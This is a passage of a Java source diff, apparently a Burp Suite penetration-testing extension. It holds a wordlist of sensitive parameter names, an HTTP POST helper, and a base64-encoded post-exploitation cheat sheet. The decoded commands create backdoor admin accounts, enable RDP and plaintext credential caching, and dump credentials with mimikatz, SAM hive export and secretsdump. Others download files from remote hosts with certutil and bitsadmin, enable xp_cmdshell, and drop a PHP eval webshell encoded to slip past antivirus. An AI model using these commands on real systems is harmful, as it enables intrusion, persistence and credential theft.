dor#valor2#valor3#valor4#valor5#origem#few#idxatv#mopp#prestador_id#xprognostico#xclasse#log_id#xadverso#guid_email#guiaavulsa_id#pl#vendor_category_id#venc3#venc2#totpc#venc5#venc4#xserie#order_info_id#an#totpp#totpv#imagen_id#esquema#atividade_id#xgarantia#discount_id#xnatureza#group_perm_id#category_child_id#newssummaryauthor#and_xevento#rolle_nr#standort_nr#ja#persnr#vorname#width#titel#filename#post_id#swidth#height#vorgaenger#matrnr#kursnr#notification_type#sheight#style_id#startnummer#bezeichnung#basename#kat_id#whabfragen#struct_id#havabfragen#abfrsql#vorlnr#ban_id#forum_id#rank_id#nr#k_id#nachname#ort#key_id#groesse#datum#image_id#entry#speise_id#word_id#absatz_id#class_id#mail_id#zid#ticket_id#queue_id#pid1#pid2#currval#forum#organizationid#institute_id#history_id#my#how#after#meetingid#mitarbeiterid#idgruppe#re#artikel_id#top#perid#pers_nr#idstelle#messageid#acctid#address_book_id#article_id#com#kid#rule_id#kosten#plz#confirm_id#race_id#vis_id#descr#seitelayout_id#vote_id#g_id#activated#show#guy#vtyp_id#timeofmove#views#meta_id#blz#bookid#teilnehmernr#weaponid#region_id#resultid#calendar#address_id#pos#d_id#serverid#cd#answer_id#categories_id#start#site_id#price_id#az#mnr#cis_id#config_key#address_format_id#tn#tax_id#mountname#standard#schweiz#partner_id#idkontakt#eventid#oldstate#topicid#sonst#pk#mountcategory#von#orders_recalculate_id#block_id#knr#msgid#ortnr#seiteabs_id#id1#um#paperid#send#wid#gi#lieferant#orgid#profile#zugang#allow#unique_id#taskid#configuration_id#jcode#ex_id#blog_id#who#section_id#mindk#beschreibung#schl#you#object_link_a_id#disallow_id#strasse#option_name#q_trid#summary_id#gameid#catid#dni#prune_id#anid#linkid#qid#word_text#id_cat#eid#privmsgs_text_id#downloadid#hid#themes_id#privmsgs_id#codi#requestid#ratingdbid#edad#secid#sitename#artid#gallid#main_module#contactid#aro_id#replace#total#root#prodid#id_paciente#mosloadposition#de#mossef#ordid#stdprice#advanced#super#editor#rol#editors#mosvote#agent#en#searchbot#cod_aplicacion#manager#geshi#author#coste#mos#menutype#session_ip#publisher#texto#actor_id#mosemailcloak#none#id_tra#sistema#help#custid#value_id#nompuerto#legacybots#id_enfermedad#tinymce#nivel#locale#load#format#registered#moscode#results#search_term#mosimage#sin#mospaging#que#sef#dorsal#coste_total#legacy#btn#repid#parent_id#time_stamp#bannerid#numero#id_auteur#titre#lang#tag#id_forum#id_groupe#id_article#alliance1#alliance2#id_message#num#fichier#id_user#id_syndic#dico#id_rubrique#id_document#id_breve#id_signature#id_type#ide#id_syndic_article#id_mot#n_agence#ville#codepostal#sess_id#num1#constraint_name#n_type#theme_id#image#referer_md5#id_fragment#new_id#version_min#liste#id_version#prix#terms_body#prenom#nid#n_client#n_compte#apid#n_dept#n_dir#age#dt_id#subdivision_id#sub_class_id#comments#cmtid#tags#checkbox#ct_id#part#lastupdated#customsettings#catalogue_id#relationmessage#englishname#ba_num_reads#at_id#bs_setting#am_id#t2#t1#message#blogcommentsaccess_id#sub_class#grfilt#tempprovkredit#ostdate#koef#bms_cat_id#bd_id#field2#field3#dd#kredit#callend#gcode#blogcommentsaccess#sender#udal#bcf_id#bfs_id#schet#grcode#blogcommentssub#blogpermissiongroup_id#us_id#bv_id#bvo_id#rusname#gbid#kontr600#realiz_opt#bs_bid#bb_id#bf_id#wuser#v_id#sklad#sd#object_sub_class_id#callstart#myexec#relationsub#id_photo#bfl_id#bml_id#blogmessagesaccess#bn_id#bsu_id#id_links#bo_id#dates#kontr620#pom#object_parent_id#ostatki#tovar#oid#bsm_id#mn_id#pcode#id_poll_ip#groupcodes#codeid#fot_id#spell_id#typenamekeeper#bt_id#odate#bdate#bs_id#id_paragraph#t4#t3#nt_id#id_contact#korschet#data_in#id_msg#bc_plugin#summaprihod#boe_c_id#bct_id#grkntr#btt_id#string#tl_id#subdivision_name#bc_id#bfp_id#bcfs_id#vcode#id_refferer#ssschet#sessid#im_id#id_poll#ba_num_voted#kontr60#id_ip#kre1#ord_id#kc#bbt_id#bst_id#bftt_id#blogpermissiongroup#it_id#chost#bo_order_number#ba_id#object_sub_id#hidden_url#bms_id#pnds#pt_id#realiz#id_catalog#wdate#bff_id#matcode#bur_cat_id#bsl_id#blogmessagesaccess_id#bcena#ostatkii#ost1#bvr_id#prih#bu_id#bp_id#isview#id_artpage#tb_id#bst_time#ba_order_num#username1#id_answer#rt_id#bot_id#korschetfilter#st_id#summachp#vt_id#data_out#journals#enumtypid#scriptname#result#bsur_id#keyname#handle#ba_date#blogcommentscc#lg_id#bft_id#ft_id#toorg#debet#orgcode#partstring#id_product#bte_id#pu_id#mt_id#edate#community#bpe_id#grtov#id_page#boe_id#sut_id#task_id#object#can#voteid#operation_id#city_id#list#page_id#banner_id#error#language_id#val#dealer_id#modify_date#regist_date#comment#payment_method#service_name#file1#rel_id#sub_large_image3#sub_image6#sub_image4#sub_image5#sub_image3#sub_image1#fix#companyid#formid#charge#page_name#deliv_fee#category_name#stock_unlimited#sale_limit#nam#target_id#tempid#point_rate#payment_image#confirm_url#dt#document_id#productid#ken_kanji#attname#parent_category_id#module_name#main_list_image#create_date#conkey#product_code#price01#price02#classcategory_id1#seminer_id#classcategory_id2#newrow#update_date#classcategory_id#yeartag#job#relname#comm#main_large_image#sub_image2#deliv_id#idx#comment5#bloc_row#ndc#comment6#comment1#comment3#comment2#creator_id#bloc_name#equip_id#recommend_product_id#file3#file2#jiscode#file6#file5#file4#news_date#rank#sub_title5#sub_title4#sub_title6#sub_title1#sub_title3#sub_title2#txt#loc#fee#committee_id#module_code#pref#disp_name#pref_id#deliv_date_id#relid#upper_rule#main_image#umeta_id#template_code#edit_flg#comment4#kiyaku_title#hiredate#csv_id#sal#attrelid#deptname#main_comment#sub_large_image4#sub_large_image5#sub_large_image6#php_dir#sub_large_image1#sub_large_image2#bloc_id#test#tpl_dir#del_flg#stock#sale_unlimited#sub_comment4#sub_comment5#sub_comment6#manuscriptid#sub_comment1#sub_comment2#sub_comment3#main_list_comment#mgr#product_flag#rule#c_commu_topic_id#c_diary_comment_log_id#idcomune#idruolo#idtrattamento#idpaziente#matricola#idpersonale#idasl#idanagrafica#idciclo#iddocumento#idservizio#idricovero#idclinica#idcamera#idtipociclo#idsistemazione#idtiporicovero#idtiposervizio#idsesso#idpagamento#idtipodimissione#idletto#iddescrizionedocumento#codice#cognome#idtipodocumento#idstatocivile#idtipologiaservizio#idtipotrattamento#idmedicofamiglia#idregistro#idreparto#iddistretto#idprovenienza#telefono#eta#figlio#reddito#denominazione#anno#idbocca#idcartellaclinica#idsistnerv#idappargenit#idtipotrasferimento#dataricovero#idcuore#cap#descrizione#idocchi#sede#idricoverohatipologia#noteaccettazione#dal#datadimissione#idorecchie#idcorpo#id_provincia#idtipologiaricovero#id_regione#idapparlocom#idcomuneresidenza#created_at#datanascita#corso#idanamnesifamil#idesameobiettivo#idcapo#idsmaglog#sesso#impiegato#luogonascita#idcute#idcollo#idsistresp#dipsede#cellulare#idaddome#php#idnaso#cf#idstatogenerale#idtrasferimento#indirizzo#genitore#dipnome#updated_at#idlinfonodi#groupname#shop#c_name#plugin_googlemap2#jfalternative#post_status#localita#prz_merce_fis#idgroupacl#comune#ana_codice#utenteid#mod_gtranslate#idlocation#rating_id#online_id#jfsections#idextra#categories#luogoid#nroordine#stat_name#gender#oggettistica#gru_userid#pv_id#parigi#direct#pm_id#idperiodo#idarticolo#what#can_codice#sub#id_nazione#client_name#acc_codice#mod_freeway_services#cleanurl#newyork#idcategory#active#box#prc_sconto1#prc_sconto3#prc_sconto4#disma#iddiscipline#job_e_date#risultato#mod_arcadebtn#jfrouter#apply#unit#newcollection#customenu#prova#cod_utente_mod#helvetica#send_id#mf_desc#nroarticolo#mod_ninja_simple_icons#sessione#cdele#statoattivitaid#bracciali#zenzaro#cod_valuta#collane#tabella#newyorkenglish#grp_id#var_id#sot_proposta_e#virtuemart#enteid#rpad#auth_id#realname#attivitaid#readmore#freewaylogin#idconfig#pin#pins#csc#cvd#cvv#cvv2#cvvc#ccv#ccid#qta_merce#charms#diritto#accessori#mod_signallogin#remember#mod_virtuemart_featureprod#padre#prc_sconto2#enter#idgara#morfeoshow#lingua#piede#gtranslate#under_menu#id_disciplina#nomedip#before#mod_virtuemart_search#arial#job_id#config_item#add_date#jfdatabase#madre#idragsoc#idsubscriptiontickets#loadmodule#jumpmenu#idsocieta#category_img#portachiavi#mf_name#codicepaziente#mod_virtuemart_randomprod#ninja#pro_codice#mod_vm_cat_menu_specific#vinod#newsfeeds#id_palestra#mod_custom#css#debug#side#dipart#areainterventoid#mod_flashmod#tipologiaenteid#emailcloak#mod_freeway_events#id_logho#codicemedico#nuova#catarticles#dst#gru_codice#idutente#idutenti#job_title#schedaid#idmlattach#zonainterventoid#totfasciaeuroid#structure_id#att_codice#blogger#plan_table_output#pagenavigation#idplugin#vote#mod_freeway_subscriptions#idconn#cerca#system#langkey#app_gruppo_e#term_taxonomy_id#statement#params#oggetto#mod_cpmfetch#signallogin#id_passwd#codrappr#coddoc#statoavanzamid#nrsez#idmlgroup#rated_id#kwick#id_citta#prc_magg1#prc_magg2#flg_fiscale#banner_url#attribute_sku_id#mod_product_list#end_date_time#purchase_id#client_url#vm_manufacturer_category#pfs_id#veteran#mod_cd_login#menu_selezione#ruoloenteid#ele_codice#pl_id#payment#idmlmail#mod_virtuemart_currencies#freeway#annoid#cod_dep#area_id#prg_art#alias_area_id#sent#po_id#yoologin#sys_context#mod_enugene#idnotsentmails#mod_virtuemart_manufacturers#menu#cache#prg_movimento_riga#url_md5#ldap#tvoti#villiam#full_news#yoocarousel#main2#main3#dat_utente_mod#user_alto#pff_id#smilie_id#mod_date#banner#pinsn#codice_comune#vm_payment_method#idclassificatore#idgroup#progetto#mod_freeway_shoppingcart#payment_extrainfo#cost_id#gmail#dat_movimento#mod_jt_slideshow#campo_bol#idcliente#prz_merce#hdesc#fp_id#jt#idfile#ji#mod_catarticles#mod_virtuemart_latestprod#mod_customenu#app_utente_e#prg_movimento#include_date#cod#flipper#naresh#cache_language_id#id_preventivo#config_owner#header#mootoolnicemenu#qualificareferenteid#modhome#id_annuncio#idtitolo#source#charmsn#swf#tutor#mod_yoo_carousel#portachiavin#idevent#mod_mainmenu#jfcontent#item_cd#tpref#id_news#mf_category_name#iddesign#moduledir#cod_clifor#fkidannofdr#mod_donimedia_select_box_menu_type1#jfcontacts#jpg#client_desc#mod_freewaylogin#mod_translate#flscrvpre#grand#mf_category_desc#payment_method_name#extended#mod_vm_prod_cat_full#mod_freeway_admin#orecchini#nlista#jfcategories#mod_cssmenu#mod_lxmenu#mod_flipper_img_rotator#fkidanagrafica#id_comune#statement_id#idatleta#inactive#mod_sidebarmenuapplestyle#candidato#ref_url#testq#ind_clifor#xmlrpc#pingback_id#l_col_list#fs_id#press#mod_freeway_products#semo#bijoux#rakesh#modulo_contatti#google#vm_manufacturer#vot_proposta_e#brend#post_date#enugene#nrcandi#invoice#home#sot_utente_e#settoreid#weblinks#contacts#id2#codcliente#news_title#job_s_date#sql_text#affiliate#backlink#core#id_attivita#index_num#etertre#manufacturer#cod_utente_cre#cod_art#ideventcategory#dat_utente_cre#cache_id#joomla#product_list#coupon#mod_sendcart#bijouxn#pagebreak#idsessione#arcade#mod_virtuemart_topten#banner_title#flg_prezzo_con_iva#partnerid#vot_utente_e#sections#xstandard#id_scheda#vm_category#mod_jumplink#exclude_date#ruoloid#contenuti#accessorin#coppermine#banlist_id#offerte#idticket#idsubscription#beneficiarioid#oggettistican#jfnewsfeeds#anelli#ship#imenu#na#nb#get_ddl#short_news#openid#titoloprogettoid#connection_id#mod_kwick_sliding_menu#matr#id_richiesta#idoggetto#lxmenu#text_id#user_basso#ver_codice#mayank#idgrouppermission#modules#client_img#does_repeat#typeid#cronid#advid#admingid#payid#tagname#optionid#templateid#applyid#searchid#styleid#medalid#pluginvarid#fldfuntype#fldfunindex#displayorder#pluginid#fldfunopen#fldfunid#fldfunhref#fldfunmemo#fldfunname#mobile#invisible#polloptionid#cachename#tagid#pluginhookid#pmid#fldfuninfo#magicid#keyid#areaid#logid#folder#allno#vieworder#classid#topped#msg#topics#rankid#timeid#iconid#intro#corpid#replies#operation#announceid#nickname#goods_id#attachment#special#hk_name#stylevarid#posterid#curtopics#allowbanip#hide#allowdelpost#db_value#picurl#yahoo#adid#digest#n_id#hidden#olimg#lastpost#signature#lastposttime#doid#authstr#tabid#org_code#typename#allowstickthread#departmentid#allowmassprune#identify#old#avatar#allowedituser#forumname#descrip#blogid#allowmoduser#lastposterid#today#tempfidlist#feedid#courseid#olid#hk_value#xh#allowpostannounce#copy#splitstring#icon#fidlist#lastpostpmtime#article#former#projectid#avatarheight#html#alloweditpoll#downloads#channelid#allowbanuser#appid#allowcensorword#emailid#lastexecuted#decl_mail#lastupdatetime#billid#vid#lastposter#allowrefund#allowviewrealname#installed#lasttid#postcount#searchstring#reason#customstatus#titleid#newpms#verifycode#forumid#attention#readperm#skype#lastsearchtime#bio#lastpostid#idcard#postdatetime#question#poster#sightml#highlight#pageid#threadorder#todaycount#currentindex#avatarwidth#magic#allowmodpost#allowviewip#pro_id#iid#decrip#alloweditpost#mailid#lastforumposterid#accountid#tids#medals#fileid#postid#closed#lastactivity#newnotices#allowviewlog#expiration#layer#ishtml#command#brand_id#disablepostctrl#fieldname#ajar#akses#aktif#akun#alamat#batas#cabang#deskripsi#foto#harga#hp#jeda#jenis#jml#judul#jumlah#kata_kunci#kata_sandi#katakunci#katasandi#kategori#kelas#keterangan#kode#kunci#lahir#nama#nama_akun#nama_ibu_kandung#nama_pengguna#namaakun#namapengguna#pekerjaan#pendidikan#pengguna#penjelasan#perusahaan#ponsel#profesi#ruang#sandi#soal#surat_elektronik#surel#tanggal#tanggal_lahir#telepon#tempat#tempat_lahir#tmp_lahir#universitas#urut#waktu#cookie#login_count#credit#card#pin#cvv#pan#password#social#ssn#account#confidential#u_pass#hashedPw";
+        data = data.replace("#","\n");
+        return data;
+    }
+
+    // base64解密 用来解决中文乱码问题
+    public String base64_decode(String s) {
+        String result = null;
+        try {
+            result = new String(helpers.base64Decode(s), "utf-8");
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+        return result;
+    }
+    //post请求
+    public static String sendPost(String url, String param) {
+        PrintWriter out = null;
+        BufferedReader in = null;
+        String result = "";
+        try {
+            URL realUrl = new URL(url);
+            // 打开和URL之间的连接
+            URLConnection conn = realUrl.openConnection();
+            // 设置通用的请求属性
+            conn.setRequestProperty("accept", "*/*");
+            conn.setRequestProperty("connection", "Keep-Alive");
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            conn.setRequestProperty("user-agent",
+                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
+            // 发送POST请求必须设置如下两行
+            conn.setDoOutput(true);
+            conn.setDoInput(true);
+            conn.setConnectTimeout(3000);
+            // 获取URLConnection对象对应的输出流
+            out = new PrintWriter(conn.getOutputStream());
+            // 发送请求参数
+            out.print(param);
+            // flush输出流的缓冲
+            out.flush();
+            // 定义BufferedReader输入流来读取URL的响应
+            in = new BufferedReader(
+                    new InputStreamReader(conn.getInputStream(),"UTF-8"));
+            String line;
+            while ((line = in.readLine()) != null) {
+                result += line;
+            }
+        } catch (Exception e) {
+            System.out.println("发送 POST 请求出现异常！"+e);
+            e.printStackTrace();
+            result = "发送请求出现异常！";
+        }
+        //使用finally块来关闭输出流、输入流
+        finally{
+            try{
+                if(out!=null){
+                    out.close();
+                }
+                if(in!=null){
+                    in.close();
+                }
+            }
+            catch(IOException ex){
+                ex.printStackTrace();
+            }
+        }
+        return result;
+    }
+
+    //windows命令收集
+    private String windows_command(){
+        String data = "6K+35omn6KGM5ZyoY21k5Lit5omn6KGM5ZG95Luk77yadGFza2xpc3QgL3N2YwrovpPlh7rnmoTnu5PmnpzotLTliLDlt6bovrnmn6Xor6IKCndpbmRvd3Plkb3ku6TmlLbpm4YK5L+h5oGv5pS26ZuGOgoK5p+l55yL57O757uf54mI5pys5ZKM6KGl5LiB5L+h5oGvOiBzeXN0ZW1pbmZvCuafpeeci+ezu+e7n+W8gOaUvuerr+WPozogbmV0c3RhdCAtYW5vCuafpeeci+ezu+e7n+i/m+eoizogdGFza2xpc3QgL3N2YwrliJflh7ror6bnu4bov5vnqIs6IHRhc2tsaXN0IC9WIC9GTyBDU1YK5p+l55yLaXDlnLDlnYDlkoxkbnPkv6Hmga86IGlwY29uZmlnIC9hbGwK5p+l55yL5b2T5YmN55So5oi3OiB3aG9hbWkgL3VzZXIK5p+l55yL6K6h566X5py655So5oi35YiX6KGoOiBuZXQgdXNlcgrmn6XnnIvorqHnrpfmnLrnlKjmiLfnu4TliJfooag6IG5ldCBsb2NhbGdyb3VwCuafpeeci+W9k+WJjeeZu+mZhueUqOaItzogcXVlcnkgdXNlcgrmn6XnnIvlvZPliY3nlKjmiLfkv53lrZjnmoTlh63or4E6IGNtZGtleSAvbGlzdArmn6XnnIvot6/nlLHkv6Hmga86IHJvdXRlIHByaW50Cuafpeeci2FycDogYXJwIC1hCuafpeeci+W9k+WJjeeUqOaIt+S/neWtmOeahOelqOaNruWHreivgToga2xpc3QK5pCc57SiROebmOejgeebmOWQjeWtl+S4umxvZ28uanBn55qE5paH5Lu2OiBjZCAvZCBEOlwgJiYgZGlyIC9iIC9zIGxvZ28uanBnCuaQnOe0oEPnm5jmlofku7blpLnkuIvlkI7nvIBjb25m5YaF5a655pyJcGFzc3dvcmQ6IGZpbmRzdHIgL3MgL2kgL24gL2Q6QzpcICJwYXNzd29yZCIgKi5jb25mCuafpeecizMzODnnq6/lj6M6IGZvciAvZiAidG9rZW5zPTIiICVpIGluICgndGFza2xpc3QgL0ZJICJTRVJWSUNFUyBlcSBUZXJtU2VydmljZSIgL05IJykgZG8gbmV0c3RhdCAtYW5vIHwgZmluZHN0ciAlaSB8IGZpbmRzdHIgTElTVEVOSU5HCldpbuiuvue9rue7iOerr+S7o+eQhjogc2V0IGh0dHBfcHJveHk9aHR0cDovLzEyNy4wLjAuMTo3ODkwICYgc2V0IGh0dHBzX3Byb3h5PWh0dHA6Ly8xMjcuMC4wLjE6Nzg5MAoK5re75Yqg55So5oi3OgoK5re75Yqg55So5oi35bm26K6+572u5a+G56CBOiBuZXQgdXNlciB0b29scyAxMjM0NTYgL2FkZArlsIbnlKjmiLfliqDlhaXnrqHnkIbnu4Q6IG5ldCBsb2NhbGdyb3VwIGFkbWluaXN0cmF0b3JzIHRvb2xzIC9hZGQK5bCG55So5oi35Yqg5YWl5qGM6Z2i57uEOiBuZXQgbG9jYWxncm91cCAiUmVtb3RlIERlc2t0b3AgVXNlcnMiIHRvb2xzIC9hZGQK5r+A5rS7Z3Vlc3TnlKjmiLc6IG5ldCB1c2VyIGd1ZXN0IC9hY3RpdmU6eWVzCuabtOaUuWd1ZXN055So5oi355qE5a+G56CBOiBuZXQgdXNlciBndWVzdCAxMjM0NTYK5bCG55So5oi35Yqg5YWl566h55CG57uEOiBuZXQgbG9jYWxnb3VwIGFkbWluaXN0cmF0b3JzIGd1ZXN0IC9hZGQKCuazqOWGjOihqOebuOWFszoKCuafpeecizMzODnnq6/lj6MgOiBSRUcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcVGVybWluYWwgU2VydmVyXFdpblN0YXRpb25zXFJEUC1UY3AiIC92IFBvcnROdW1iZXIK5byA5ZCv6L+c56iL5qGM6Z2iIDogUkVHIEFERCBIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIiAiU2VydmVyIC92IGZEZW55VFNDb25uZWN0aW9ucyAvdCBSRUdfRFdPUkQgL2QgMCAvZgrms6jlhozooajmipPlj5bmmI7mloc6IFJFRyBBREQgSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxTZWN1cml0eVByb3ZpZGVyc1xXRGlnZXN0IC92IFVzZUxvZ29uQ3JlZGVudGlhbCAvdCBSRUdfRFdPUkQgL2QgMSAvZgpyZHDov57mjqXpu5jorqTnmoQxMOS4quiusOW9lTogcmVnIHF1ZXJ5ICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxEZWZhdWx0IgpyZHDov57mjqXpu5jorqTnmoTmiYDmnInorrDlvZU6IHJlZyBxdWVyeSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVycyIgL3MK5p+l5om+6L2v5Lu25a6J6KOF55uu5b2VOiByZWcgcXVlcnkgSEtMTSAvZiBmb3htYWlsIC90IFJFR19TWiAvcwoK5bel5YW355So5rOV5ZG95LukOgoKbWltaWthdHrmn6XnnIvlvZPliY3lr4bnoIE6IG1pbWlrYXR6ICJsb2ciICJwcml2aWxlZ2U6ZGVidWciICJzZWt1cmxzYTpsb2dvbnBhc3N3b3JkcyIgImV4aXQiCm1pbWlrYXR65oqT5Y+WZG9tYWlu5a+G56CBOiBtaW1pa2F0eiAibHNhZHVtcDo6ZGNzeW5jIC9kb21haW46dGVzdC5jb20gL2FsbCAvY3N2IiAiZXhpdCIKcmVn5a+85Ye65rOo5YaM6KGoaGFzaDogcmVnIHNhdmUgaGtsbVxzYW0gYzpccHJvZ3JhbWRhdGFcc2FtLmhpdmUgJiYgcmVnIHNhdmUgaGtsbVxzeXN0ZW0gYzpccHJvZ3JhbWRhdGFcc3lzdGVtLmhpdmUKbWltaWthdHror7vlj5bms6jlhozooajlr7zlh7rnmoRoYXNo5L+h5oGvOiBtaW1pa2F0eiAibG9nIiAibHNhZHVtcDo6c2FtIC9zYW06c2FtLmhpdmUgL3N5c3RlbTpzeXN0ZW0uaGl2ZSIgImV4aXQiCmltcGFja2V05YyF55qEc2VjcmV0c2R1bXA6IHNlY3JldHNkdW1wLmV4ZSAtc2FtIHNhbS5oaXZlIC1zeXN0ZW0gc3lzdGVtLmhpdmUgTE9DQUwKbm1hcOaJq+aPj+awuOaBkuS5i+iTnea8j+a0njogbm1hcCAtcDQ0NSAtLXNjcmlwdCBzbWItdnVsbi1tczE3LTAxMCAxMjcuMC4wLjEKbWV0ZXJwcmV0ZXLmiornm67moIfnmoQzMzg556uv5Y+j6L2s5Y+R5YiwdnBz55qENjY2Nuerr+WPozogcG9ydGZ3ZCBhZGQgLWwgNjY2NiAtcCAzMzg5IC1yIDEyNy4wLjAuMQphdHRyaWLliJvlu7rpmpDol4/mlofku7Y6IGF0dHJpYiArcyAraCArciAqLmV4ZQoubmV06Z2Z6buY5a6J6KOFOiBkb3ROZXRGeDQwX0Z1bGxfeDg2X3g2NC5leGUgL3EgL25vcmVzdGFydCAvQ2hhaW5pbmdQYWNrYWdlIEZ1bGxYNjRCb290c3RyYXBwZXIKbGN456uv5Y+j6L2s5Y+ROiDmnKzlnLDnm5HlkKw6IGxjeC5leGUgLWxpc3RlbiAxMTAgMzQ1Njfnm67moIfmiafooYw6IGxjeC5leGUgLXNsYXZlIHZwc2lwIDExMCAxMjcuMC4wLjEgMzM4OQrmiavmj493ZWIudHh05paH5Lu255qE572R56uZ5qCH6aKYOiB3aGF0d2ViIC1pIHdlYi50eHQgLXAgVGl0bGUgd2hhdHdlYgpXaW7nu4jnq6/orr7nva7ku6PnkIY6IHNldCBodHRwX3Byb3h5PXNvY2tzNTovLzEyNy4wLjAuMToxMDgwICYmIHNldCBodHRwc19wcm94eT1zb2NrczU6Ly8xMjcuMC4wLjE6MTA4MAp4ZnJlZXJkcCBoYXNo6L+e5o6lcmRwOiB4ZnJlZXJkcCAvdTphZG1pbmlzdHJhdG9yIC9wdGg6Y2NlZjIwOGM2NDg1MjY5YzIwZGIyY2FkMjE3MzRmZTcgL3Y6MTAuMjAuMjQuMTAwIC9jZXJ0LWlnbm9yZSAvL3NlcnZlciAyMDEyCnJ1bmFz6L+Q6KGM5YW25a6D6LSm5oi35p2D6ZmQ55qE56iL5bqPIDogcnVuYXMgL3VzZXI6aG9zdG5hbWVcdXNlcm5hbWUgL3NhICJjbWQuZXhlIgoK57O757uf5LiL6L295paH5Lu2OgoKd2luZG93czIwMDPpu5jorqTmlofku7Y6IEJsb2IwXzAuYmluIC8v5Y+v5Lul5q2j5bi45omn6KGMCmNlcnR1dGls5LiL6L295paH5Lu2OiBjZXJ0dXRpbCAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xOTIuMTY4LjUuMjE6ODg4L25jLnR4dCBjOlxuYy50eHQKY2VydHV0aWzliKDpmaTorrDlvZU6IGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzE5Mi4xNjguMS4xMTUvcm9ib3RzLnR4dCBkZWxldGUKYml0c2FkbWlu5LiL6L295paH5Lu2OiBiaXRzYWRtaW4gL3Jhd3JldHVybiAvdHJhbnNmZXIgZ2V0ZmlsZSBodHRwOi8vZG93bmxvYWQuc3lzaW50ZXJuYWxzLmNvbS9maWxlcy9QU1Rvb2xzLnppcCBjOlxQc3Rvb2xzLnppcAoKTXNzcWznjq/looM6Cgptc3NxbOW8gOWQr3hwX2NtZHNoZWxsOiBFWEVDIHNwX2NvbmZpZ3VyZSAnc2hvdyBhZHZhbmNlZCBvcHRpb25zJywgMTtSRUNPTkZJR1VSRTtFWEVDIHNwX2NvbmZpZ3VyZSAneHBfY21kc2hlbGwnLCAxO1JFQ09ORklHVVJFOwptc3NxbOi+k+WHuuaWh+S7tjogZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICc+PmM6XHdpbmRvd3NcdGVtcFxpbmZvLnR4dCBzZXQgL3A9ImJhc2U2NF9lbmNvZGUiIDxudWwnOyAvL+S7o+abv2VjaG/ovpPlh7oK5p+l55yLY+ebmOS4i3dlYi5jb25maWfmlofku7Y6IGZpbmRzdHIgL2M6IlVzZXIgSWQ9IiAvYzoiUGFzc3dvcmQ9IiAvc2kgd2ViLmNvbmZpZyA+PiB0bXBzLmxvZ3MgPG51bCc7CuW4uOinhOW3peS9nOe7hOWGhee9keeOr+Wig+S4i+eahG1zc3Fs5a6e5L6LOiBQb3dlclNoZWxsIC1Db21tYW5kICJbU3lzdGVtLkRhdGEuU3FsLlNxbERhdGFTb3VyY2VFbnVtZXJhdG9yXTo6SW5zdGFuY2UuR2V0RGF0YVNvdXJjZXMoKSIKCldtaWPlkb3ku6Q6Cgp3bWlj6L+c56iL6L+e5o6l5py65ZmoOiB3bWljIC9ub2RlOiIxOTIuMTY4LjEuMjAiIC91c2VyOiJkb21haW5cYWRtaW5pc3RyYXRvciIgL3Bhc3N3b3JkOiIxMjM0NTYiCuafpeeci+ezu+e7n+Wuieijhei9r+S7tjogd21pYyBwcm9kdWN0IGdldCBuYW1lLHZlcnNpb24K5p+l55yL57O757uf54mI5pysOiB3bWljIE9TIGdldCBDYXB0aW9uLENTRFZlcnNpb24sT1NBcmNoaXRlY3R1cmUsVmVyc2lvbgrmoLnmja5QaWTmn6Xmib7ov5vnqIvot6/lvoQ6IHdtaWMgcHJvY2VzcyBnZXQgbmFtZSxleGVjdXRhYmxlcGF0aCxwcm9jZXNzaWR8ZmluZHN0ciBwaWQK5p+l55yL56OB55uY5L+h5oGvOiBXbWljIGxvZ2ljYWxkaXNrCuafpeeci+e7hCxob3N0bmFtZSznrYnkv6Hmga86IHdtaWMgY29tcHV0ZXJzeXN0ZW0gZ2V0IE5hbWUsIERvbWFpbiwgTWFudWZhY3R1cmVyLCBNb2RlbCwgVXNlcm5hbWUsIFJvbGVzL2Zvcm1hdDpsaXN0CgpMaW51eOWRveS7pOaUtumbhgpMaW51eOe7iOerr+W8gOWQr3NvY2tz5Luj55CGOgoKbGludXjorr7nva7nu4jnq6/ku6PnkIY6IGV4cG9ydCBodHRwc19wcm94eT1odHRwOi8vMTI3LjAuMC4xOjc4OTAgaHR0cF9wcm94eT1odHRwOi8vMTI3LjAuMC4xOjc4OTAgYWxsX3Byb3h5PXNvY2tzNTovLzEyNy4wLjAuMTo3ODkwCmxpbnjnu4jnq6/mkJzntKLova/ku7Y6IGZpbmQgLyAtbmFtZSBwYXNzLnR4dApsaW51eOafpeaJvuWQjue8gHByb3BlcnRpZXPmlofku7blhoXlrrnluKZwYXNzd29yZOWtl+agtzogZmluZCAvIC1uYW1lICoucHJvcGVydGllcyB8IHhhcmdzIGdyZXAgcGFzc3dvcmQgLy94bWwsc2gscHl0aG9uLOetieetiQpsaW51eOaKinRvbWNhdOebruW9leaWh+S7tuWSjOaWh+S7tuWkueWIl+ihqOWvvOWHuuWIsG9hLnR4dDogZmluZCAvaG9tZS90b21jYXQvIC10eXBlIGYgPiBvYS50eHQK57yW56CB5a2X56ymYmFzZTY054S25ZCOZWNob+i+k+WHumxvZ28ucGhw5Zyo6L+b6KGM6Kej56CBOiBlY2hvIC1uICJQRDl3YUhBZ1pYWmhiQ2drWDFCUFUxUmJZMjFrWFNrN1B6NCsiIHwgYmFzZTY0IC1kID4gbG9nby5waHAgLy/lj6/nu5Xov4fmnYDova/mi6bmiKrlhbPplK7lrZcKCgo=";
+        data = base64_decode(data);
+        return data;
+    }
+
+    //windows本地查询进程
+    private String windows_local_tasklist(String tasklist){
+        String data = "";
+        tasklist = "\n"+tasklist;
